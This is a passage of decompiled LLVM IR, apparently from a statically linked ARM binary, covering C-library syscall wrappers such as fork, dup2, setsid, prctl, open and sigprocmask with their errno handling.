  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_13ef0 = call i32 @vfork()
  store i32 %v0_13ef0, i32* @r0, align 4
  %v2_13ef4 = icmp ugt i32 %v0_13ef0, -4097
  br i1 %v2_13ef4, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_13f08, %entry
  %merge = phi i32 [ %v0_13ef0, %entry ], [ %v0_13f08, %dec_label_pc_13f08 ]
  ret i32 %merge

bb1:                                              ; preds = %entry
  %v4_13f00 = icmp eq i32 %v0_13ef0, -38
  br i1 %v4_13f00, label %dec_label_pc_13f08, label %bb2

dec_label_pc_13f08:                               ; preds = %bb1
  %v0_13f08 = call i32 @fork()
  store i32 %v0_13f08, i32* @r0, align 4
  %v2_13f0c = icmp ugt i32 %v0_13f08, -4097
  br i1 %v2_13f0c, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_13f08
  %v0_13f14 = call i32 @__syscall_error()
  ret i32 %v0_13f14

; uselistorder directives
  uselistorder i32 %v0_13f08, { 1, 2, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_13f20 = load i32, i32* @r2, align 4
  store i32 %arg2, i32* @ip, align 4
  %v1_13f30 = add i32 %arg2, -12
  store i32 %v6_13f20, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_13f30, 2
  br i1 %tmp, label %dec_label_pc_13f58, label %dec_label_pc_13f50

dec_label_pc_13f50:                               ; preds = %entry
  %v0_13f50 = call i32 @__GI_fcntl64()
  br label %dec_label_pc_13f84

dec_label_pc_13f58:                               ; preds = %entry
  %v2_13f60 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_13f60, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_13f60, -4095
  br i1 %tmp8, label %dec_label_pc_13f84, label %dec_label_pc_13f70

dec_label_pc_13f70:                               ; preds = %dec_label_pc_13f58
  %v0_13f70 = call i32 @__errno_location()
  %v0_13f74 = load i32, i32* %r4.global-to-local, align 4
  %v1_13f74 = sub i32 0, %v0_13f74
  %v2_13f78 = inttoptr i32 %v0_13f70 to i32*
  store i32 %v1_13f74, i32* %v2_13f78, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13f84

dec_label_pc_13f84:                               ; preds = %dec_label_pc_13f70, %dec_label_pc_13f58, %dec_label_pc_13f50
  %storemerge = phi i32 [ %v0_13f50, %dec_label_pc_13f50 ], [ %v2_13f60, %dec_label_pc_13f58 ], [ -1, %dec_label_pc_13f70 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_13f60, { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
}

define i32 @__GI_fcntl64() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_13fb4 = load i32, i32* @r0, align 4
  store i32 %v0_13fb4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13fb4, -4095
  br i1 %tmp, label %dec_label_pc_13fd0, label %dec_label_pc_13fc0

dec_label_pc_13fc0:                               ; preds = %entry
  %v0_13fc0 = call i32 @__errno_location()
  %v0_13fc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_13fc4 = sub i32 0, %v0_13fc4
  %v2_13fc8 = inttoptr i32 %v0_13fc0 to i32*
  store i32 %v1_13fc4, i32* %v2_13fc8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13fd0

dec_label_pc_13fd0:                               ; preds = %entry, %dec_label_pc_13fc0
  %v0_13fd0 = phi i32 [ %v0_13fb4, %entry ], [ -1, %dec_label_pc_13fc0 ]
  ret i32 %v0_13fd0

; uselistorder directives
  uselistorder i32 %v0_13fb4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13fd0, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @access() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1400c = load i32, i32* @r4, align 4
  store i32 %v3_1400c, i32* %stack_var_-8, align 4
  %v0_14010 = call i32 @access()
  store i32 %v0_14010, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14010, -4095
  br i1 %tmp, label %dec_label_pc_14030, label %dec_label_pc_14020

dec_label_pc_14020:                               ; preds = %entry
  %v0_14020 = call i32 @__errno_location()
  %v0_14024 = load i32, i32* %r4.global-to-local, align 4
  %v1_14024 = sub i32 0, %v0_14024
  %v2_14028 = inttoptr i32 %v0_14020 to i32*
  store i32 %v1_14024, i32* %v2_14028, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14030

dec_label_pc_14030:                               ; preds = %entry, %dec_label_pc_14020
  %v0_14030 = phi i32 [ %v0_14010, %entry ], [ -1, %dec_label_pc_14020 ]
  %v2_14034 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14034, i32* @r4, align 4
  ret i32 %v0_14030

; uselistorder directives
  uselistorder i32 %v0_14010, { 1, 0, 2 }
  uselistorder i32 ()* @access, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14030, { 1, 0 }
}

define i32 @chdir() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14038 = load i32, i32* @r4, align 4
  store i32 %v3_14038, i32* %stack_var_-8, align 4
  %v0_1403c = call i32 @chdir()
  store i32 %v0_1403c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1403c, -4095
  br i1 %tmp, label %dec_label_pc_1405c, label %dec_label_pc_1404c

dec_label_pc_1404c:                               ; preds = %entry
  %v0_1404c = call i32 @__errno_location()
  %v0_14050 = load i32, i32* %r4.global-to-local, align 4
  %v1_14050 = sub i32 0, %v0_14050
  %v2_14054 = inttoptr i32 %v0_1404c to i32*
  store i32 %v1_14050, i32* %v2_14054, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1405c

dec_label_pc_1405c:                               ; preds = %entry, %dec_label_pc_1404c
  %v0_1405c = phi i32 [ %v0_1403c, %entry ], [ -1, %dec_label_pc_1404c ]
  %v2_14060 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14060, i32* @r4, align 4
  ret i32 %v0_1405c

; uselistorder directives
  uselistorder i32 %v0_1403c, { 1, 0, 2 }
  uselistorder i32 ()* @chdir, { 1, 0 }
  uselistorder label %dec_label_pc_1405c, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14064 = load i32, i32* @r4, align 4
  store i32 %v3_14064, i32* %stack_var_-8, align 4
  %v1_14068 = call i32 @close(i32 %arg1)
  store i32 %v1_14068, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_14068, -4095
  br i1 %tmp, label %dec_label_pc_14088, label %dec_label_pc_14078

dec_label_pc_14078:                               ; preds = %entry
  %v0_14078 = call i32 @__errno_location()
  %v0_1407c = load i32, i32* %r4.global-to-local, align 4
  %v1_1407c = sub i32 0, %v0_1407c
  %v2_14080 = inttoptr i32 %v0_14078 to i32*
  store i32 %v1_1407c, i32* %v2_14080, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14088

dec_label_pc_14088:                               ; preds = %entry, %dec_label_pc_14078
  %v0_14088 = phi i32 [ %v1_14068, %entry ], [ -1, %dec_label_pc_14078 ]
  %v2_1408c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1408c, i32* @r4, align 4
  ret i32 %v0_14088

; uselistorder directives
  uselistorder i32 %v1_14068, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14088, { 1, 0 }
}

define i32 @dup2() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14090 = load i32, i32* @r4, align 4
  store i32 %v3_14090, i32* %stack_var_-8, align 4
  %v0_14094 = call i32 @dup2()
  store i32 %v0_14094, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14094, -4095
  br i1 %tmp, label %dec_label_pc_140b4, label %dec_label_pc_140a4

dec_label_pc_140a4:                               ; preds = %entry
  %v0_140a4 = call i32 @__errno_location()
  %v0_140a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_140a8 = sub i32 0, %v0_140a8
  %v2_140ac = inttoptr i32 %v0_140a4 to i32*
  store i32 %v1_140a8, i32* %v2_140ac, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_140b4

dec_label_pc_140b4:                               ; preds = %entry, %dec_label_pc_140a4
  %v0_140b4 = phi i32 [ %v0_14094, %entry ], [ -1, %dec_label_pc_140a4 ]
  %v2_140b8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_140b8, i32* @r4, align 4
  ret i32 %v0_140b4

; uselistorder directives
  uselistorder i32 %v0_14094, { 1, 0, 2 }
  uselistorder i32 ()* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_140b4, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_140bc = load i32, i32* @r4, align 4
  store i32 %v3_140bc, i32* %stack_var_-8, align 4
  %v0_140c0 = call i32 @fork()
  store i32 %v0_140c0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_140c0, -4095
  br i1 %tmp, label %dec_label_pc_140e0, label %dec_label_pc_140d0

dec_label_pc_140d0:                               ; preds = %entry
  %v0_140d0 = call i32 @__errno_location()
  %v0_140d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_140d4 = sub i32 0, %v0_140d4
  %v2_140d8 = inttoptr i32 %v0_140d0 to i32*
  store i32 %v1_140d4, i32* %v2_140d8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_140e0

dec_label_pc_140e0:                               ; preds = %entry, %dec_label_pc_140d0
  %v0_140e0 = phi i32 [ %v0_140c0, %entry ], [ -1, %dec_label_pc_140d0 ]
  %v2_140e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_140e4, i32* @r4, align 4
  ret i32 %v0_140e0

; uselistorder directives
  uselistorder i32 %v0_140c0, { 1, 0, 2 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder label %dec_label_pc_140e0, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_140ec = ptrtoint i32* %stack_var_-12 to i32
  %v2_140f8 = call i32 @getrlimit(i32 7, i32 %v2_140ec)
  %v1_140fc = icmp slt i32 %v2_140f8, 0
  br i1 %v1_140fc, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v5_14104 = load i32, i32* %stack_var_-12, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_1410c = phi i32 [ 256, %entry ], [ %v5_14104, %bb ]
  ret i32 %v5_1410c

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14110 = load i32, i32* @r4, align 4
  store i32 %v3_14110, i32* %stack_var_-8, align 4
  %v0_14118 = load i32, i32* @r0, align 4
  store i32 %v0_14118, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14118, -4095
  br i1 %tmp, label %dec_label_pc_14134, label %dec_label_pc_14124

dec_label_pc_14124:                               ; preds = %entry
  %v0_14124 = call i32 @__errno_location()
  %v0_14128 = load i32, i32* %r4.global-to-local, align 4
  %v1_14128 = sub i32 0, %v0_14128
  %v2_1412c = inttoptr i32 %v0_14124 to i32*
  store i32 %v1_14128, i32* %v2_1412c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14138.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14134

dec_label_pc_14134:                               ; preds = %entry, %dec_label_pc_14124
  %v2_14138 = phi i32 [ %v3_14110, %entry ], [ %v2_14138.pre, %dec_label_pc_14124 ]
  %v0_14134 = phi i32 [ %v0_14118, %entry ], [ -1, %dec_label_pc_14124 ]
  store i32 %v2_14138, i32* @r4, align 4
  ret i32 %v0_14134

; uselistorder directives
  uselistorder i32 %v0_14118, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14134, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1413c = load i32, i32* @r4, align 4
  store i32 %v3_1413c, i32* %stack_var_-8, align 4
  %v0_14140 = call i32 @getpid()
  store i32 %v0_14140, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14140, -4095
  br i1 %tmp, label %dec_label_pc_14160, label %dec_label_pc_14150

dec_label_pc_14150:                               ; preds = %entry
  %v0_14150 = call i32 @__errno_location()
  %v0_14154 = load i32, i32* %r4.global-to-local, align 4
  %v1_14154 = sub i32 0, %v0_14154
  %v2_14158 = inttoptr i32 %v0_14150 to i32*
  store i32 %v1_14154, i32* %v2_14158, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14160

dec_label_pc_14160:                               ; preds = %entry, %dec_label_pc_14150
  %v0_14160 = phi i32 [ %v0_14140, %entry ], [ -1, %dec_label_pc_14150 ]
  %v2_14164 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14164, i32* @r4, align 4
  ret i32 %v0_14160

; uselistorder directives
  uselistorder i32 %v0_14140, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14160, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14168 = load i32, i32* @r4, align 4
  store i32 %v3_14168, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1418c, label %dec_label_pc_1417c

dec_label_pc_1417c:                               ; preds = %entry
  %v0_1417c = call i32 @__errno_location()
  %v0_14180 = load i32, i32* %r4.global-to-local, align 4
  %v1_14180 = sub i32 0, %v0_14180
  %v2_14184 = inttoptr i32 %v0_1417c to i32*
  store i32 %v1_14180, i32* %v2_14184, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14190.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1418c

dec_label_pc_1418c:                               ; preds = %entry, %dec_label_pc_1417c
  %v2_14190 = phi i32 [ %v3_14168, %entry ], [ %v2_14190.pre, %dec_label_pc_1417c ]
  %v0_1418c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1417c ]
  store i32 %v2_14190, i32* @r4, align 4
  ret i32 %v0_1418c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1418c, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_141b0 = load i32, i32* @r0, align 4
  %v3_141b0 = call i32 @ioctl(i32 %v0_141b0, i32 %arg1, i32 %arg2)
  store i32 %v3_141b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_141b0, -4095
  br i1 %tmp, label %dec_label_pc_141d0, label %dec_label_pc_141c0

dec_label_pc_141c0:                               ; preds = %entry
  %v0_141c0 = call i32 @__errno_location()
  %v0_141c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_141c4 = sub i32 0, %v0_141c4
  %v2_141c8 = inttoptr i32 %v0_141c0 to i32*
  store i32 %v1_141c4, i32* %v2_141c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_141d0

dec_label_pc_141d0:                               ; preds = %entry, %dec_label_pc_141c0
  %v0_141d0 = phi i32 [ %v3_141b0, %entry ], [ -1, %dec_label_pc_141c0 ]
  ret i32 %v0_141d0

; uselistorder directives
  uselistorder i32 %v3_141b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_141d0, { 1, 0 }
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_141e4 = load i32, i32* @r4, align 4
  store i32 %v3_141e4, i32* %stack_var_-8, align 4
  %v0_141e8 = call i32 @kill()
  store i32 %v0_141e8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_141e8, -4095
  br i1 %tmp, label %dec_label_pc_14208, label %dec_label_pc_141f8

dec_label_pc_141f8:                               ; preds = %entry
  %v0_141f8 = call i32 @__errno_location()
  %v0_141fc = load i32, i32* %r4.global-to-local, align 4
  %v1_141fc = sub i32 0, %v0_141fc
  %v2_14200 = inttoptr i32 %v0_141f8 to i32*
  store i32 %v1_141fc, i32* %v2_14200, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14208

dec_label_pc_14208:                               ; preds = %entry, %dec_label_pc_141f8
  %v0_14208 = phi i32 [ %v0_141e8, %entry ], [ -1, %dec_label_pc_141f8 ]
  %v2_1420c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1420c, i32* @r4, align 4
  ret i32 %v0_14208

; uselistorder directives
  uselistorder i32 %v0_141e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14208, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_14220 = and i32 %arg2, 64
  %v2_14220 = icmp eq i32 %v1_14220, 0
  br i1 %v2_14220, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v6_14210 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_14210, 65536
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_14230 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_14230, i32* @r2, align 4
  %v4_14238 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_1423c = icmp eq i32 %v4_14238, -4096
  store i1 %v7_1423c, i1* @cpsr_z, align 1
  store i32 %v4_14238, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_14238, -4095
  br i1 %tmp, label %dec_label_pc_14258, label %dec_label_pc_14248

dec_label_pc_14248:                               ; preds = %.thread1
  %v0_14248 = call i32 @__errno_location()
  %v0_1424c = load i32, i32* %r4.global-to-local, align 4
  %v1_1424c = sub i32 0, %v0_1424c
  %v2_14250 = inttoptr i32 %v0_14248 to i32*
  store i32 %v1_1424c, i32* %v2_14250, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14258

dec_label_pc_14258:                               ; preds = %.thread1, %dec_label_pc_14248
  %v0_14258 = phi i32 [ %v4_14238, %.thread1 ], [ -1, %dec_label_pc_14248 ]
  ret i32 %v0_14258

; uselistorder directives
  uselistorder i32 %v4_14238, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_14258, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_14274 = load i32, i32* @r0, align 4
  %v2_14274 = inttoptr i32 %v0_14274 to i8*
  %v3_14274 = call i32 @__libc_open(i8* %v2_14274, i32 577)
  %v0_14278 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14278, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_14278 = and i32 %v3_14274, 36
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_14278 = phi i32 [ %v3_14274, %entry ], [ %v6_14278, %bb ]
  ret i32 %v7_14278

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1427c = load i32, i32* @r4, align 4
  store i32 %v3_1427c, i32* %stack_var_-8, align 4
  %v1_14280 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_14280 = call i32 @pipe([2 x i32] %v1_14280)
  store i32 %v2_14280, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_14280, -4095
  br i1 %tmp, label %dec_label_pc_142a0, label %dec_label_pc_14290

dec_label_pc_14290:                               ; preds = %entry
  %v0_14290 = call i32 @__errno_location()
  %v0_14294 = load i32, i32* %r4.global-to-local, align 4
  %v1_14294 = sub i32 0, %v0_14294
  %v2_14298 = inttoptr i32 %v0_14290 to i32*
  store i32 %v1_14294, i32* %v2_14298, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_142a0

dec_label_pc_142a0:                               ; preds = %entry, %dec_label_pc_14290
  %v0_142a0 = phi i32 [ %v2_14280, %entry ], [ -1, %dec_label_pc_14290 ]
  %v2_142a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_142a4, i32* @r4, align 4
  ret i32 %v0_142a0

; uselistorder directives
  uselistorder i32 %v2_14280, { 1, 0, 2 }
  uselistorder label %dec_label_pc_142a0, { 1, 0 }
}

define i32 @prctl() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_142a8 = load i32, i32* @r4, align 4
  store i32 %v3_142a8, i32* %stack_var_-8, align 4
  %v0_142b0 = call i32 @prctl()
  store i32 %v0_142b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_142b0, -4095
  br i1 %tmp, label %dec_label_pc_142d0, label %dec_label_pc_142c0

dec_label_pc_142c0:                               ; preds = %entry
  %v0_142c0 = call i32 @__errno_location()
  %v0_142c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_142c4 = sub i32 0, %v0_142c4
  %v2_142c8 = inttoptr i32 %v0_142c0 to i32*
  store i32 %v1_142c4, i32* %v2_142c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_142d0

dec_label_pc_142d0:                               ; preds = %entry, %dec_label_pc_142c0
  %v0_142d0 = phi i32 [ %v0_142b0, %entry ], [ -1, %dec_label_pc_142c0 ]
  %v2_142d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_142d4, i32* @r4, align 4
  ret i32 %v0_142d0

; uselistorder directives
  uselistorder i32 %v0_142b0, { 1, 0, 2 }
  uselistorder i32 ()* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_142d0, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_142d8 = load i32, i32* @r4, align 4
  store i32 %v3_142d8, i32* %stack_var_-8, align 4
  %v1_142dc = load i32, i32* @r1, align 4
  %v2_142dc = inttoptr i32 %v1_142dc to i32*
  %v3_142dc = load i32, i32* @r2, align 4
  %v4_142dc = call i32 @read(i32 %arg1, i32* %v2_142dc, i32 %v3_142dc)
  store i32 %v4_142dc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_142dc, -4095
  br i1 %tmp, label %dec_label_pc_142fc, label %dec_label_pc_142ec

dec_label_pc_142ec:                               ; preds = %entry
  %v0_142ec = call i32 @__errno_location()
  %v0_142f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_142f0 = sub i32 0, %v0_142f0
  %v2_142f4 = inttoptr i32 %v0_142ec to i32*
  store i32 %v1_142f0, i32* %v2_142f4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_142fc

dec_label_pc_142fc:                               ; preds = %entry, %dec_label_pc_142ec
  %v0_142fc = phi i32 [ %v4_142dc, %entry ], [ -1, %dec_label_pc_142ec ]
  %v2_14300 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14300, i32* @r4, align 4
  ret i32 %v0_142fc

; uselistorder directives
  uselistorder i32 %v4_142dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_142fc, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14304 = load i32, i32* @r4, align 4
  store i32 %v3_14304, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1432c, label %dec_label_pc_1431c

dec_label_pc_1431c:                               ; preds = %entry
  %v0_1431c = call i32 @__errno_location()
  %v0_14320 = load i32, i32* %r4.global-to-local, align 4
  %v1_14320 = sub i32 0, %v0_14320
  %v2_14324 = inttoptr i32 %v0_1431c to i32*
  store i32 %v1_14320, i32* %v2_14324, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14330.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1432c

dec_label_pc_1432c:                               ; preds = %entry, %dec_label_pc_1431c
  %v2_14330 = phi i32 [ %v3_14304, %entry ], [ %v2_14330.pre, %dec_label_pc_1431c ]
  %v0_1432c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1431c ]
  store i32 %v2_14330, i32* @r4, align 4
  ret i32 %v0_1432c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1432c, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14334 = load i32, i32* @r4, align 4
  store i32 %v3_14334, i32* %stack_var_-8, align 4
  %v0_14338 = call i32 @setsid()
  store i32 %v0_14338, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14338, -4095
  br i1 %tmp, label %dec_label_pc_14358, label %dec_label_pc_14348

dec_label_pc_14348:                               ; preds = %entry
  %v0_14348 = call i32 @__errno_location()
  %v0_1434c = load i32, i32* %r4.global-to-local, align 4
  %v1_1434c = sub i32 0, %v0_1434c
  %v2_14350 = inttoptr i32 %v0_14348 to i32*
  store i32 %v1_1434c, i32* %v2_14350, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14358

dec_label_pc_14358:                               ; preds = %entry, %dec_label_pc_14348
  %v0_14358 = phi i32 [ %v0_14338, %entry ], [ -1, %dec_label_pc_14348 ]
  %v2_1435c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1435c, i32* @r4, align 4
  ret i32 %v0_14358

; uselistorder directives
  uselistorder i32 %v0_14338, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14358, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14360 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_14360, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_143685 = load i32, i32* @r4, align 4
  store i32 %v3_143685, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14388

bb:                                               ; preds = %entry
  %v3_14368 = load i32, i32* @r4, align 4
  store i32 %v3_14368, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_14388, label %dec_label_pc_14374

dec_label_pc_14374:                               ; preds = %bb
  %v0_14374 = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_14380 = inttoptr i32 %v0_14374 to i32*
  store i32 22, i32* %v2_14380, align 4
  %v0_143ac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_143ac

dec_label_pc_14388:                               ; preds = %.thread, %bb
  %v7_14388 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_14388, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_14388, -4095
  br i1 %tmp13, label %dec_label_pc_143a8, label %dec_label_pc_14398

dec_label_pc_14398:                               ; preds = %dec_label_pc_14388
  %v0_14398 = call i32 @__errno_location()
  %v0_1439c = load i32, i32* %r4.global-to-local, align 4
  %v1_1439c = sub i32 0, %v0_1439c
  %v2_143a0 = inttoptr i32 %v0_14398 to i32*
  store i32 %v1_1439c, i32* %v2_143a0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_143a8

dec_label_pc_143a8:                               ; preds = %dec_label_pc_14388, %dec_label_pc_14398
  %v0_143a8 = phi i32 [ %v7_14388, %dec_label_pc_14388 ], [ -1, %dec_label_pc_14398 ]
